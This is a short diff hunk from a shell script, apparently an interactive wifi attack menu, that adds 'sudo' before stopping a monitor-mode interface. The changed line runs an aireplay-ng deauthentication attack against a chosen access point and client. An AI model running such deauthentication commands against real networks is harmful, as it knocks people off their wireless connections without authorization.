@@ -44,7 +44,7 @@ do
 	echo "number of packets:"
 	read 'p'
 
-	sudo aireplay-ng -0 $p -a $bssid -c $mac "$iface"mon;airmon-ng stop "$iface"mon
+	sudo aireplay-ng -0 $p -a $bssid -c $mac "$iface"mon;sudo airmon-ng stop "$iface"mon
 	x=1	
 	;;
 	2)
